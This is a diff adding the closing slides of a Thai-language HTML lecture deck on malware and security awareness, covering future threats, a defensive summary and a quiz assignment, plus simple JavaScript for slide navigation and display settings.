+            <h2>🔮 Future Threats</h2>
+            <div class="diagram-grid">
+                <div class="diagram-box">
+                    <h3>🤖 AI-Powered Attacks</h3>
+                    <p>ใช้ AI เขียน Phishing email ที่แนบเนียนภาษาไทย หรือสร้าง Malware ใหม่ๆ</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>Deepfake</h3>
+                    <p>ปลอมเสียง CEO สั่งโอนเงิน หรือปลอมหน้ายืนยันตัวตน (e-KYC)</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>⚛️ Quantum Computing</h3>
+                    <p>ในอนาคตอาจถอดรหัส (Encryption) ปัจจุบันได้ภายในไม่กี่วินาที</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>📝 สรุป (Summary)</h2>
+            <ol>
+                <li><strong>Know your enemy:</strong> แยกให้ออกว่าเป็น Virus, Worm หรือ Trojan เพื่อรู้วิธีรับมือ</li>
+                <li><strong>Ransomware is deadly:</strong> สำรองข้อมูลคือทางรอดเดียวที่ชัวร์ที่สุด</li>
+                <li><strong>Human firewall:</strong> Social Engineering อันตรายกว่า Malware ต้องมีสติ</li>
+                <li><strong>Defense in Depth:</strong> อย่าฝากความหวังไว้ที่ Antivirus ตัวเดียว</li>
+            </ol>
+        </div>
+
+        <div class="slide hero-slide">
+            <h1>Q & A</h1>
+            <p>มีคำถามสงสัย หรือ อยากแชร์ประสบการณ์ไหมครับ?</p>
+            <div style="margin-top: 50px;">
+                <p><strong>Assignment:</strong></p>
+                <p>อย่าลืมทำ Quiz 1 และลองเล่น Phishing Quiz ใน LMS</p>
+            </div>
+            <p style="margin-top: 30px; font-size: 1rem; color: var(--secondary-color);">Thank you & Stay Secure! 🔒</p>
+        </div>
+
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const progressBar = document.getElementById('progressBar');
+        const totalSlides = slides.length;
+
+        function updateSlide() {
+            slides.forEach((slide, index) => {
+                slide.classList.remove('active');
+                if (index === currentSlide) {
+                    slide.classList.add('active');
+                }
+            });
+            
+            // Update Progress Bar
+            const progress = ((currentSlide + 1) / totalSlides) * 100;
+            progressBar.style.width = `${progress}%`;
+        }
+
+        function moveSlide(direction) {
+            currentSlide += direction;
+            if (currentSlide < 0) currentSlide = 0;
+            if (currentSlide >= totalSlides) currentSlide = totalSlides - 1;
+            updateSlide();
+        }
+
+        // Keyboard Navigation
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') moveSlide(1);
+            if (e.key === 'ArrowLeft') moveSlide(-1);
+        });
+
+        // Theme Toggle
+        function toggleTheme() {
+            const body = document.body;
+            const currentTheme = body.getAttribute('data-theme');
+            body.setAttribute('data-theme', currentTheme === 'dark' ? 'light' : 'dark');
+        }
+
+        // Font Size Adjustment
+        function adjustFont(change) {
+            const html = document.documentElement;
+            const style = window.getComputedStyle(html, null).getPropertyValue('font-size');
+            const currentSize = parseFloat(style);
+            html.style.fontSize = (currentSize + change) + 'px';
+        }
+
+        // Full Screen
+        function toggleFullScreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+            }
+        }
+
+        // Initialize
+        updateSlide();
+    </script>
+</body>
+</html>
